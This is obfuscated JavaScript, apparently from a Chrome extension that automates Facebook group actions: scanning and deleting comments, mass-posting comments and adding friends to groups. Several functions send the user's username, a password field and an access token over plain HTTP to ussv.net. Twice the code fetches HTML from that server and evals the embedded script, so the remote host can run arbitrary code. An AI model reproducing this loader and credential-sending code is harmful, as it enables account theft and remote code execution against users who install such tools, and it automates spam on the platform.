            B0 = "KeySearch",
            o0 = "ScanComment",
            Z0 = "#GroupCore_scan_note",
            A = "ScanPost";
        this[f1W.U8Y] = function(o) {
            var U = $(f1W.B6Y)[f1W.o07]();
            chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.r4Y, f1W.v7v], function(F) {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'POST',
                    action: 'xhttp',
                    url: 'http://ussv.net/addon/html/html_panel_fb_stt_tools.php',
                    data: "k=" + ussv_key_base + "&username=" + F[f1W.r4Y] + "&mabimat=" + F[f1W.v7v] + "&type=" + o[f1W.O4y] + "&id=" + o[f1W.W7O] + "&token=" + U
                }, function(W) {
                    var V = "n0b",
                        E = "M0b";
                    if (f1W[E](W[f1W.x3y]("Kg8"), null)) {
                        var W = W[f1W.F6r]("Kg8", "");
                        W = W[f1W.F6r]("0KgU", "==");
                        W = W[f1W.F6r]("C9kI", "=");
                        W = W[f1W.F6r]("C9kI", "=");
                        var W = uss_js_parse(uss_change_js(W));
                    };
                    var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>");
                    if (f1W[V](W.length, 1)) {
                        var O = "";
                    } else {
                        var O = W[1];
                    }
                    var Z = W[0];
                    $("#group_tools_panel_" + o[f1W.W7O])[f1W.Q0I](Z);
                    eval(O[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
                });
            });
        };
        this[A] = function(D, G) {
            var C = "Ðã có L?nh D?ng !",
                z = "i0b",
                P = "#GroupCore_scan_ketqua",
                J = "#GroupCore_scan_aut";

            function c() {
                var W = "#GroupCore_scan_btn_stop_",
                    V = ".GroupCore_scan_btn_start";
                $(J)[f1W.o07](f1W.c8Q);
                $(V)[f1W.l6Q](f1W.Y5a);
                $(W + D[f1W.A7y])[f1W.v37]();
            }
            if (!G) {
                var G = function() {};
            };
            var L = $(Z0),
                E0 = $(P);
            if (D[f1W.O8a]) {
                var F0 = D[f1W.O8a];
            } else {
                var F0 = f1W.A9I + D[f1W.G7v] + f1W.I8Y + D[f1W.p87];
            }
            if (f1W[z]($(J)[f1W.o07](), f1W.S9a)) {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: F0
                }, function(W) {
                    var V = "G0b",
                        E = "v0b",
                        O = "u0b",
                        Z = "c0b",
                        F = "J0b",
                        o = "I0b",
                        U = "T0b",
                        p = "a0b",
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        $(L)[f1W.m8y]("Hoàn Thành : " + W.error[f1W.q10]);
                        c();
                    } else {
                        var M = W.data.length,
                            b = parseInt($("#GroupCore_scan_TK_post")[f1W.m8y]()) + M;
                        $("#GroupCore_scan_TK_post")[f1W.m8y](b);
                        if (f1W[p](M, 0)) {
                            $(L)[f1W.m8y]("Hoàn Thành");
                            c();
                        } else {
                            for (var H = 0; f1W[U](H, M); H++) {
                                var R = W.data[H][f1W.W7O],
                                    R = R[f1W.X3Q]("_"),
                                    X = R[1],
                                    f = "KXD";
                                if (W.data[H][f1W.W47]) {
                                    var n = W.data[H][f1W.W47][f1W.W7O],
                                        Y = W.data[H][f1W.W47][f1W.G6y],
                                        f = '<a target="_blank" href="https://facebook.com/' + n + '">' + Y + '</a>';
                                }
                                var N = W.data[H][f1W.Z9y],
                                    N = N[f1W.X3Q]("+"),
                                    N = N[0][f1W.F6r]("T", " "),
                                    g = "";
                                if (W.data[H][f1W.q10]) {
                                    var g = W.data[H][f1W.q10];
                                } else {
                                    if (W.data[H][f1W.K8v]) {
                                        var g = W.data[H][f1W.K8v];
                                    }
                                }
                                if (f1W[o](g.length, 320)) {
                                    var g = g[f1W.d3v](0, 320) + " ... <a target='_blank' href='http://fb.com/" + X + "'>Xem Thêm</a>";
                                }
                                var g = g[f1W.F6r](/\n/, "<br/>");
                                if (f1W[F](X, "960517817293565")) {
                                    $(L)[f1W.m8y]("Hoàn Thành 1");
                                } else {
                                    if (f1W[Z](H, M - 1)) {
                                        if (W[f1W.L9Q][f1W.Q8y]) {
                                            D[f1W.O8a] = W[f1W.L9Q][f1W.Q8y];
                                            $(L)[f1W.m8y]("Ti?p t?c quét...");
                                            var T = $("#GroupCore_scan_sl_limit_post_" + D[f1W.A7y])[f1W.o07]();
                                            if (f1W[O](T, 0)) {
                                                GroupCore[A](D);
                                            } else {
                                                if (f1W[E](b, T)) {
                                                    $(L)[f1W.m8y]("Ti?n trình dã du?c d?ng vì dã d?t gi?i h?n s? Post Scan Limit");
                                                    c();
                                                } else {
                                                    GroupCore[A](D);
                                                }
                                            }
                                        } else {
                                            $(L)[f1W.m8y]("Hoàn Thành 2");
                                            c();
                                        }
                                    }
                                    var I = '<div id="Div_KQ_Scan_Post_' + X + '" class="_4-u2 mbm _5jmm _5pat _5v3q" style="padding-top: 10px;">';
                                    I += '<div>';
                                    I += '	<div style="float:left">';
                                    I += '		<img style="  width: 35px;" src="http://i.imgur.com/ETnw7RP.jpg">';
                                    I += '	</div>';
                                    I += '	<div style="position: relative;left: 5px;">';
                                    I += '		' + f + '';
                                    I += '		<a style="float: right;" target="_blank" href="https://facebook.com/' + X + '">' + N + '</a><br/>';
                                    I += '		Found: <a><span data-id="' + X + '" class="Post_Total_Cmt_Found" style="color: rgb(242, 20, 96);" id="Post_Total_Cmt_Found_' + X + '">0</span></a> / <span id="Post_Total_Cmt_' + X + '">...</span>';
                                    I += '	</div>';
                                    I += '	<div style="clear: both;">';
                                    I += '		' + g + '';
                                    I += '	</div>';
                                    I += '</div>';
                                    I += '<div>';
                                    I += '		<div id="List_Cmt_Found_' + X + '" style="border-top: 1px solid #e1e2e3;margin: 5px;padding: 5px;">';
                                    I += '		</div>';
                                    I += '		<div style="clear: both;"></div> ';
                                    I += '</div>';
                                    I += "</div>";
                                    if (f1W[V]($("#GroupCore_scan_sl_sapxep_post_" + D[f1W.A7y])[f1W.o07](), 1)) {
                                        $(E0)[f1W.p3Q](I);
                                    } else {
                                        $(E0)[f1W.u2r](I);
                                    }
                                    GroupCore[o0]({
                                        "Post_Id": X,
                                        "Limit": $("#GroupCore_scan_sl_search_total_cmt_" + D[f1W.A7y])[f1W.o07](),
                                        "Token": D[f1W.p87],
                                        "KeySearch": D[B0],
                                        "Id": D[f1W.A7y]
                                    });
                                }
                            };
                        }
                    }
                });
            } else {
                $(L)[f1W.m8y](C);
            }
        };
        this[o0] = function(c) {
            var L = "Limit",
                E0 = $(Z0);
            $[f1W.c9y]({
                url: " https://graph.facebook.com/fql?q=SELECT id, fromid, text, time, likes, user_likes FROM comment WHERE object_id = " + c[w] + " ORDER BY time DESC LIMIT " + c[L] + "&access_token=" + c[f1W.p87],
                type: "GET",
                dataType: "json"
            })[f1W.D2I](function(E) {
                var O = "s4b",
                    Z = "k4b",
                    F = "X4b",
                    o = "y4b",
                    U = "F4b",
                    p = "B4b",
                    M = "j4b",
                    b = "fromid",
                    H = "A0b";
                if (E.error) {
                    $(E0)[f1W.m8y](E.error);
                } else {
                    var R = "",
                        X = E.data.length;
                    $("#Post_Total_Cmt_" + c[w])[f1W.m8y](X);
                    var f = parseInt($("#GroupCore_scan_TK_cmt")[f1W.m8y]());
                    $("#GroupCore_scan_TK_cmt")[f1W.m8y](f + X);
                    var n = 0;
                    for (var Y = 0; f1W[H](Y, X); Y++) {
                        var N = E.data[Y][f1W.W7O],
                            g = E.data[Y][f1W.m8y],
                            T = E.data[Y][b],
                            I = c[w] + "_" + N;
                        if (f1W[M](I[f1W.X3Q]("|").length, 2)) {} else {
                            var I = I[f1W.F6r](c[w] + "_" + c[w], c[w]);
                        }
                        var D = '<a target="_blank" href="https://facebook.com/' + T + '">' + T + '</a>';
                        if (f1W[p](g[f1W.x3y](c[B0]), null)) {
                            var G = "background: rgb(253, 253, 253);border: 1px solid;border-color: #F46696;",
                                C = new RegExp(c[B0], "gi"),
                                g = g[f1W.F6r](C, "<span style='color: rgb(242, 65, 98);'>" + c[B0] + "</span>"),
                                z = "Found",
                                n = parseInt($("#Post_Total_Cmt_Found_" + c[w])[f1W.m8y]());
                            $("#Post_Total_Cmt_Found_" + c[w])[f1W.m8y](n + 1);
                            var P = parseInt($("#GroupCore_scan_TK_found_cmt")[f1W.m8y]());
                            $("#GroupCore_scan_TK_found_cmt")[f1W.m8y](P + 1);
                            n += 1;
                            if (f1W[U]($("#GroupCore_scan_sl_auto_del_" + c[f1W.A7y])[f1W.o07](), 1)) {
                                $(E0)[f1W.m8y]("Ti?n hành xóa Bình Lu?n " + N);
                                GroupCore[W0]({
                                    "comment_id": I,
                                    "Note": ".row_st_more.Find." + N
                                });
                            }
                        } else {
                            var G = "",
                                z = "";
                        }
                        var J = '<div class="row_st_more Find ' + c[w] + ' ' + N + ' ' + I + ' ' + z + '" style="' + G + '">';
                        J += '<div class="right"> <span style="color: rgb(144, 189, 228);margin-right: 10px;font-size: 11px;"></span><a class="div_popup_close del_scan_cmt" role="button" href="#" data-id="' + I + '" title="Del">Del</a> </div>';
                        J += D + " (<a target='_blank' href='http://fb.com/" + N + "'>Link</a>):<br/>";
                        J += g;
                        J += "</div>";
                        if (f1W[o]($("#GroupCore_scan_sl_show_cmt_" + c[f1W.A7y])[f1W.o07](), 1)) {
                            if (f1W[F](z, "Found")) {
                                $("#List_Cmt_Found_" + c[w])[f1W.p3Q](J);
                            };
                        } else {
                            $("#List_Cmt_Found_" + c[w])[f1W.p3Q](J);
                        }
                    };
                    if (f1W[Z]($("#GroupCore_scan_sl_show_post_" + c[f1W.A7y])[f1W.o07](), 1)) {
                        if (f1W[O](n, 0)) {
                            $("#Div_KQ_Scan_Post_" + c[w])[f1W.w5I]();
                        }
                    }
                    $(".Post_Total_Cmt_Found")[f1W.L0Q]("click")[f1W.Z6O](function() {
                        var W = $(this)[f1W.V6Q]("data-id");
                        $(".row_st_more.Find." + W)[f1W.v37]();
                        $(".row_st_more.Find.Found." + W)[f1W.R4r]();
                    });
                    $(".del_scan_cmt")[f1W.L0Q]("click")[f1W.Z6O](function() {
                        $(this)[f1W.l6Q](1000);
                        var W = $(this)[f1W.V6Q]("data-id"),
                            V = W;
                        GroupCore[W0]({
                            "comment_id": W,
                            "Note": ".row_st_more.Find." + V
                        });
                    });
                }
            });
        };
        this[W0] = function(F) {
            var o = "Ðang ti?n hành xóa...",
                U = F[f1W.b9Q][f1W.X3Q](f1W.S1v)[f1W.L9a],
                p = F[f1W.b9Q][f1W.X3Q](f1W.S1v)[f1W.S9a],
                M = f1W.X2r + F[f1W.b9Q] + f1W.V7v + p + f1W.e6I + U + f1W.n8v + _fb[f1W.z1Y] + f1W.y00 + _fb[f1W.z1Y] + f1W.d67 + _fb[f1W.O00];
            $(F[f1W.a7y])[f1W.m8y](o);
            $[f1W.c9y]({
                url: "https://www.facebook.com/ufi/delete/comment/",
                type: "POST",
                dataType: "json",
                data: M
            })[f1W.D2I](function(W) {
                var V = "g4b",
                    E = "D4b",
                    O = "Y4b",
                    Z = "m4b";
                if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                        W = JSON[f1W.i2O](W);
                    if (W.error) {
                        $(F[f1W.a7y])[f1W.m8y](W[f1W.S7Y] + ": " + W[f1W.m87]);
                    } else {
                        $(F[f1W.a7y])[f1W.m8y]("Xóa thành công Bình Lu?n " + F[f1W.b9Q]);
                        setTimeout(function() {
                            $(F[f1W.a7y])[f1W.v37]();
                        }, 1000);
                    }
                }
                if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                    $(F[f1W.a7y])[f1W.m8y]("Ðã xãy ra l?i khi xóa, có th? b?n không có quy?n xóa Bình lu?n này...");
                } else {}
            })[f1W.H4I](function(W) {});
        };
        this[f1W.r87] = function(V) {
            $(f1W.E0r + V)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var W = ".group_tools.";
                $(f1W.z9y)[f1W.R4r]();
                $(W + V)[f1W.F50](f1W.Y5a);
            });
        };
        this[H0] = function(X) {
            var f = "CallBack";

            function n(b) {
                var H = b[f1W.X3Q](f1W.w30)[f1W.L9a],
                    R = b[f1W.X3Q](f1W.w30)[f1W.S9a];
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/hovercard/group.php?id=" + H + "&endpoint=/ajax/hovercard/group.php?id=" + H + "&__user=" + _fb[f1W.z1Y] + "&__a=1",
                    type: "GET",
                    dataType: "json"
                })[f1W.D2I](function(W) {
                    var V = "w4b",
                        E = "x4b",
                        O = "l4b";
                    if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                            W = JSON[f1W.i2O](W),
                            Z = document[f1W.W8O]('html');
                        Z[f1W.V5I] = W[f1W.R1v][f1W.y9X][0][1][f1W.a8Y];
                        $(Z)[f1W.q8r](".uiBoxGray.topborder")[f1W.w5I]();
                        var F = $(Z)[f1W.Q0I]()[f1W.F6r]('<div class="fsm fwn fcg">', '<div class="InfoGroup">'),
                            o = $(F)[f1W.q8r](".InfoGroup")[f1W.Q0I](),
                            U = $(Z)[f1W.q8r](".fsm.fwn.fcg").length,
                            p = $(Z)[f1W.q8r](".fsm.fwn.fcg:eq(" + (f1W[V](U, 1)) + ")")[f1W.Q0I](),
                            M = $(X[f])[f1W.o07]();
                        $(X[f])[f1W.o07](M[f1W.F6r](b, H + "| " + p[f1W.X3Q](" ")[0] + " | " + R));
                    } else {}
                });
            }
            $[f1W.c9y]({
                url: "https://graph.facebook.com/fql?q=select creator, gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 5000&access_token=" + X[f1W.p87],
                type: "GET",
                dataType: "json"
            })[f1W.D2I](function(W) {
                var V = "C4b",
                    E = "Group_TT";
                if (W.error) {
                    $(X[f1W.a7y])[f1W.m8y](W.error);
                } else {
                    var O = W.data.length;
                    $(X[f1W.a7y])[f1W.m8y]("L?y thành công " + O + " Group");
                    $(X[f1W.M87][E])[f1W.m8y](O);
                    var Z = "";
                    for (var F = 0; f1W[V](F, O); F++) {
                        Z += W.data[F][f1W.i0v] + "|" + W.data[F][f1W.G6y] + "\n";
                        n(W.data[F][f1W.i0v] + "|" + W.data[F][f1W.G6y]);
                    };
                    $(X[f])[f1W.o07](Z);
                }
            });
        };
        this[f1W.q2Q] = function(U) {
            var p = "Name_Id",
                M = ' &access_token=',
                b = "Post_Limit",
                H = 'LIMIT ',
                R = "Type_Get",
                X = 'https://graph.facebook.com/fql?q=SELECT post_id FROM stream WHERE source_id=';
            if (U[f1W.O8a]) {
                var f = U[f1W.O8a];
            } else {
                var f = X + U[f1W.G7v] + f1W.X6v + U[R] + H + U[b] + M + U[f1W.p87];
                U[p] = f1W.G2r;
            }
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: f
            }, function(W) {
                var V = "Q4b",
                    E = "t4b",
                    O = "Post_TT",
                    W = JSON[f1W.i2O](W);
                if (W.error) {
                    $(U[f1W.a7y])[f1W.m8y]("L?i : " + W.error[f1W.q10]);
                } else {
                    var Z = W.data.length;
                    GroupCore[f1W.H1X](U[f1W.M87][O], Z);
                    $(U[f1W.a7y])[f1W.m8y]("L?y thành công " + Z + " Post");
                    for (var F = 0; f1W[E](F, Z); F++) {
                        if (f1W[V](U[p], "id")) {
                            var o = W.data[F][f1W.W7O];
                        } else {
                            var o = W.data[F][f1W.G2r];
                        }
                        var o = o[f1W.X3Q]("_")[1];
                        GroupCore[q0]({
                            "status": o,
                            "Note": U[f1W.a7y],
                            "Aut": U[f1W.Y9I],
                            "Msg": U[p0],
                            "TK": U[f1W.M87],
                            "Token": U[f1W.p87],
                            "Type_Post": U[u],
                            "UnfollowPost": U[S],
                            "Url_Post": U[Q],
                            "Data_Post": U[r0],
                        });
                    };
                }
            });
        };
        this[q0] = function(X) {
            var f = "Z1b",
                n = "O1b",
                Y = "V1b";

            function N(W) {
                var V = "S1b",
                    E = "P1b",
                    O = "z1b",
                    Z = "N1b",
                    F = "h1b",
                    o = "R1b",
                    U = "f1b",
                    p = "H1b",
                    M = "q1b",
                    b = "b1b",
                    H = "U1b";
                if (f1W[H](X[u], "Token") || f1W[b](X[u], "USS")) {
                    if (W.error) {
                        $(X[f1W.a7y])[f1W.Q0I]('<span style="color:red">' + W.error[f1W.q10] + '</span>');
                        GroupCore[f1W.H1X](X[f1W.M87][f1W.e1I]);
                        if (f1W[M](W.error, 1446005)) {
                            $(X[f1W.Y9I])[f1W.o07]("0");
                            acc_doing[f1W.f17] = 0;
                        } else if (f1W[p](W.error, 1446002)) {} else {
                            $(X[f1W.Y9I])[f1W.o07]("0");
                        }
                    } else {
                        $(X[f1W.a7y])[f1W.m8y]("Bình lu?n Post " + X[f1W.p0O] + " Thành công.");
                        if (f1W[U](X[S], 1)) {
                            GroupCore[S]({
                                "Post_Id": X[f1W.p0O],
                                "Note": X[f1W.a7y]
                            });
                        };
                        GroupCore[f1W.H1X](X[f1W.M87][f1W.q4I]);
                    }
                } else {
                    if (f1W[o](W[f1W.D60], 4) && f1W[F](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v],
                            R = W,
                            W = W[f1W.F6r]("for (;;);", ""),
                            W = JSON[f1W.i2O](W);
                        if (W.error) {
                            $(X[f1W.a7y])[f1W.Q0I]('<span style="color:red">' + W[f1W.S7Y] + '</span>');
                            GroupCore[f1W.H1X](X[f1W.M87][f1W.e1I]);
                            $(X[f1W.Y9I])[f1W.o07]("0");
                            if (f1W[Z](W.error, 1446005)) {
                                acc_doing[f1W.f17] = 0;
                            };
                        } else {
                            if (f1W[O](X[S], 1)) {
                                GroupCore[S]({
                                    "Post_Id": X[f1W.p0O],
                                    "Note": X[f1W.a7y]
                                });
                            };
                            $(X[f1W.a7y])[f1W.m8y]("Bình lu?n Post " + X[f1W.p0O] + " Thành công.");
                            GroupCore[f1W.H1X](X[f1W.M87][f1W.q4I]);
                        }
                    } else if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        GroupCore[f1W.H1X](X[f1W.M87][f1W.e1I]);
                        $(X[f1W.a7y])[f1W.m8y]("Bình lu?n Post " + X[f1W.p0O] + " Th?t B?i.");
                    }
                }
            }
            GroupCore[f1W.H1X](X[f1W.M87][f1W.z3I]);
            var g = X[p0][f1W.X3Q]("|");
            X[p0] = g[uss[f1W.K0v](g.length)][f1W.F6r](/USSV-RANDOM-INT/gi, uss[f1W.K0v]({
                "type": "int",
                "lg": 12
            }))[f1W.F6r](/&/gi, "%26");
            if (f1W[Y](X[u], "Token")) {
                var T = "https://graph.facebook.com/" + X[f1W.p0O] + "/comments?message=" + X[p0] + "&method=post&access_token=" + X[f1W.p87],
                    I = "GET",
                    D = "";
            } else if (f1W[n](X[u], "USS")) {
                var T = X[Q][f1W.X3Q]("\n"),
                    T = T[uss[f1W.K0v](T.length)],
                    I = "POST",
                    D = X[r0][f1W.F6r](/USSVID/gi, X[f1W.p0O])[f1W.F6r](/USSVCONENT/gi, escape(X[p0]))[f1W.F6r](/USSVTOKEN/gi, X[f1W.p87]);
            } else {
                var T = "https://www.facebook.com/ajax/ufi/add_comment.php",
                    I = "POST",
                    D = "ft_ent_identifier=" + X[f1W.p0O] + "&comment_text=" + X[p0] + "&source=0&client_id=1428771072785:1275809172&reply_fbid&parent_comment_id&rootid=u_0_25&clp=&attached_sticker_fbid=0&attached_photo_fbid=0&&&feed_context={\"last_view_time\":0,\"fbfeed_context\":true,\"location_type\":2,\"outer_object_element_id\":\"mall_post_" + X[f1W.p0O] + ":6\",\"object_element_id\":\"mall_post_" + X[f1W.p0O] + ":6\",\"is_ad_preview\":false,\"is_editable\":false}&ft[tn]=[]&ft[fbfeed_location]=2&ft[id]=" + X[f1W.p0O] + "&ft[author]=" + _fb[f1W.z1Y] + "&nctr[_mod]=pagelet_group_mall&av=" + _fb[f1W.z1Y] + "&__user=" + _fb[f1W.z1Y] + "&__a=1&__req=o&fb_dtsg=" + _fb[f1W.O00];
            }
            if (f1W[f](X[u], "USS")) {
                chrome[f1W.d60][f1W.K4r]({
                    method: I,
                    action: 'xhttp',
                    url: T,
                    data: D
                }, function(W) {
                    var W = JSON[f1W.i2O](W);
                    N(W);
                });
            } else {
                $[f1W.c9y]({
                    url: T,
                    dataType: "json",
                    type: I,
                    data: D
                })[f1W.D2I](function(W) {
                    N(W);
                });
            }
        };
        this[S] = function(F) {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/litestand/follow_post",
                type: "Post",
                dataType: "json",
                data: "message_id=" + F[w] + "&follow=0&__user=" + _fb[f1W.z1Y] + "&__a=1&__req=11&fb_dtsg=" + _fb[f1W.O00]
            })[f1W.D2I](function(W) {
                var V = "W2b",
                    E = "d1b",
                    O = "K1b",
                    Z = "L1b";
                if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                        W = JSON[f1W.i2O](W);
                    $(F[f1W.a7y])[f1W.Q0I]("B? theo gi?i bài vi?t thành công !");
                } else if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                    $(F[f1W.a7y])[f1W.Q0I]("B? theo gi?i bài vi?t Th?t B?i !");
                } else {}
            });
        };
        this[K] = function(X, f) {
            var n = "Friend_Id",
                Y = "TimeWait";

            function N(W) {
                var V = "p2b",
                    E = "Stop",
                    O = "btn",
                    Z = "o2b",
                    F = "r2b",
                    o = "E2b";
                if (f1W[o]($(W[f1W.Y9I])[f1W.o07](), 0)) {
                    $(W[f1W.a7y])[f1W.Q0I]("Ðã có yêu c?u d?ng invite !");
                    acc_doing[f1W.I0O] = 0;
                    $(W[f1W.H1X][Y])[f1W.Q0I]("Hoàn Thành");
                    f(true);
                } else {
                    $(W[f1W.H1X][Y])[f1W.Q0I](img_load_s);
                    var U = $(W[f1W.L37])[f1W.o07](),
                        p = U[f1W.X3Q]("\n")[0];
                    if (f1W[F](p.length, 5) && f1W[Z](U[f1W.X3Q]("\n").length, 1)) {
                        $(W[f1W.a7y])[f1W.Q0I]("Group không h?p l?, ti?n trình d?ng t?i dây !");
                        $(W[f1W.H1X][Y])[f1W.Q0I]("Hoàn Thành");
                        acc_doing[f1W.I0O] = 0;
                        $(W[f1W.Y9I])[f1W.o07]("0");
                        $(W[O][f1W.Z0y])[f1W.l6Q](500);
                        $(W[O][E])[f1W.v37]();
                        f(true);
                    } else {
                        var M = p[f1W.X3Q]("|")[0],
                            b = p[f1W.X3Q]("|")[1];
                        $(W[f1W.L37])[f1W.o07](U[f1W.F6r](p + "\n", "")[f1W.F6r](p, ""));
                        $(W[f1W.a7y])[f1W.Q0I]("Ðang ti?n hành thêm " + W[n] + " vào Group " + M + " ... " + img_load_s);
                        var H = W[n],
                            H = H[f1W.X3Q]("|");
                        for (var R = 0; f1W[V](R, H.length); R++) {
                            g(M, b, H[R]);
                        };
                    }
                }
            }

            function g(M, b, H) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/groups/members/add_post.php",
                    type: "Post",
                    dataType: "json",
                    data: "fb_dtsg=" + _fb[f1W.O00] + "&group_id=" + M + "&source=typeahead&ref=&message_id=u_jsonp_2_1&members=" + H + "&freeform=Name&__user=" + _fb[f1W.z1Y] + "&__a=1&__req=n"
                })[f1W.D2I](function(W) {
                    var V = "i2b",
                        E = "Time",
                        O = "ThanhCong",
                        Z = "ThatBai",
                        F = "n2b",
                        o = "M2b",
                        U = "e2b";
                    if (f1W[U](W[f1W.D60], 4) && f1W[o](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                            W = JSON[f1W.i2O](W);
                        if (W.error) {
                            if (f1W[F](W.error, 1376015)) {
                                $(X[f1W.a7y])[f1W.Q0I](X[n] + " Ðã là thành viên c?a Group <a target='_blank' href='http://fb.com/" + M + "'>" + b + "</a>!<br/>");
                            } else {
                                $(X[f1W.a7y])[f1W.Q0I]("Thêm " + X[n] + " vào Group <a target='_blank' href='http://fb.com/" + M + "'>" + b + "</a> Th?t B?i !<br/>" + W[f1W.m87]);
                            }
                            GroupCore[f1W.H1X](X[f1W.H1X][Z]);
                        } else {
                            $(X[f1W.a7y])[f1W.Q0I]("Thêm " + X[n] + " vào Group <a target='_blank' href='http://fb.com/" + M + "'>" + b + "</a> Thành Công !");
                            GroupCore[f1W.H1X](X[f1W.H1X][O]);
                        }
                    } else {
                        $(X[f1W.a7y])[f1W.Q0I]("Thêm " + H + " vào Group " + b + " Th?t B?i !");
                        GroupCore[f1W.H1X](X[f1W.H1X][Z]);
                    }
                    var p = $(X[E])[f1W.o07]();
                    $(X[f1W.H1X][Y])[f1W.Q0I]("Vui lòng ch? " + f1W[V](p, 1000) + "s d? ti?p t?c...");
                    setTimeout(function() {
                        N(X);
                    }, p);
                });
            }
            if (!f) {
                var f = function() {};
            };
            N(X);
        };
        this[f1W.H1X] = function(W, V) {
            if (!V) {
                var V = f1W.S9a;
            };
            var E = parseInt($(W)[f1W.m8y]());
            $(W)[f1W.m8y](E + V);
        };
    }

    function div_ussv_setting(O) {
        if ($(f1W.v2Q).length) {
            $(f1W.v2Q)[f1W.l6Q](f1W.Y5a);
            hide_show_menu_setting();
            $(f1W.W77)[f1W.v37]();
            $(f1W.b4Q)[f1W.l6Q](f1W.Y5a);
        } else {
            chrome[f1W.d60][f1W.K4r]({
                method: 'GET',
                action: 'xhttp',
                url: 'http://ussv.net/addon/html/html_panel_setting.php',
                data: "xczxc=sads"
            }, function(W) {
                var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>"),
                    V = W[0],
                    E = W[1];
                $("body")[f1W.u2r](V);
                thaotac_ussv_setting();
                hide_show_menu_setting();
                eval(E[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
            });
        }
    }

    function ussv_passwordNotapad(E) {
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://notepad.cc/options/password/set/' + E,
            data: "password=hau"
        }, function(W) {
            var V = W[f1W.x3y](E);
            thongbao_log(1, "Ð?t M?t Kh?u Thành Công cho Link: " + V);
        });
    }

    function uss() {
        var z4 = "xungho",
            Y4 = "country",
            P4 = "region",
            m4 = "city",
            J4 = "ip",
            c4 = "loc",
            a4 = "Reconnect",
            d0 = "Server",
            F1 = "HolaCountryList",
            E1 = "ztun",
            x4 = "ClearProxy",
            S4 = "Code",
            l4 = "User",
            G4 = "HolaServer",
            t4 = "Ip",
            O4 = "Btn",
            Z1 = "http",
            r1 = "Encode",
            d4 = "Name",
            j1 = "js",
            o1 = "Country",
            M1 = "Coppy";
        this.data = "";
        this[f1W.G47] = function(W, V, E) {
            var O = "m62",
                Z = "s62";
            l = gl[f1W.Y5v](W, V);
            if (f1W[Z](V, undefined) || f1W[O](W, f1W.x0r)) {
                l = W;
            }
            x = new XMLHttpRequest();
            x[f1W.d5y](f1W.v0O, l, f1W.R30);
            x[f1W.h0r]();
            this.data = x[f1W.H8v];
            return x[f1W.H8v];
        };
        this[f1W.c2O] = function(W, V, E) {
            var O = 'application/x-www-form-urlencoded; charset=UTF-8';
            x = new XMLHttpRequest();
            x[f1W.d5y](f1W.k6Q, V, f1W.R30);
            x[f1W.x1I](f1W.r27, O);
            x[f1W.h0r](E);
            this.data = x[f1W.H8v];
            return x[f1W.H8v];
        };
        this[f1W.e9O] = function(W, V) {};
        this[f1W.r5Q] = function(W) {
            var V = "D62",
                E = "Y62";
            if (f1W[E](W[f1W.O4y], 1)) {
                data = JSON[f1W.i2O](uss[f1W.G47]("https://ussv.net/user/file/fb_stt/checkpoint_alert_" + uss_aut(1) + "_ussH1995_" + uss_aut(5) + ".php"));
                return data;
            } else if (f1W[V](W[f1W.O4y], 2)) {
                url = "https://ussv.net/ajax/get_fb_acc.php";
                datalogin = "type=alertcheckpoint&reset_dcom=yes&user_key=" + uss_aut(5) + "&fb_id=" + W[f1W.v1Y] + "&user=" + uss_aut(1) + "&mabimat=" + uss_aut(2);
                data = JSON[f1W.i2O](uss[f1W.c2O](0, "https://ussv.net/ajax/get_fb_acc.php", datalogin));
                return data;
            }
        };
        this[f1W.C37] = function(F) {
            var o = "g62";
            if (f1W[o](F[f1W.O4y], f1W.v0Q)) {
                chrome[f1W.v1O][f1W.z50][f1W.v0Q](F.data, function() {
                    var W = "lJ",
                        V = "l62",
                        E = "C62";
                    if (f1W[E](F[f1W.V0r], null) || f1W[V](F[f1W.V0r], undefined)) {} else {
                        var O = "USSV Thông Báo",
                            Z = _lJ[f1W.G3v]({
                                "t": F[W],
                                "id": F[f1W.V0r],
                                "r": "hj"
                            });
                        uss[f1W.H7O]({
                            "title": O,
                            "body": Z,
                            "link": F[f1W.X0Q]
                        });
                    }
                });
            } else {}
        };
        this[f1W.H7O] = function(W) {
            var V = "onclick",
                E = "onshow",
                O = "w62",
                Z = 'http://i.imgur.com/BV9IylH.png',
                F = "requestPermission",
                o = "granted",
                U = "permission",
                p = "x62",
                M = 'Please us a modern version of Chrome, Firefox, Opera or Firefox.';
            if (!Notification) {
                alert(M);
                return;
            }
            if (f1W[p](Notification[U], o)) Notification[F]();
            var b = new Notification(W[f1W.U4v], {
                icon: Z,
                body: W[f1W.V0r]
            });
            if (f1W[O](W[f1W.X0Q], undefined)) {
                b[E] = function() {
                    setTimeout(b[f1W.U00][f1W.y1Y](b), f1W.P8O);
                };
            } else {
                b[V] = function() {
                    window[f1W.d5y](W[f1W.X0Q]);
                };
            }
        };
        this[f1W.O1X] = function(V) {
            if (!V) {
                var V = function() {};
            };
            chrome[f1W.d60][f1W.K4r]({
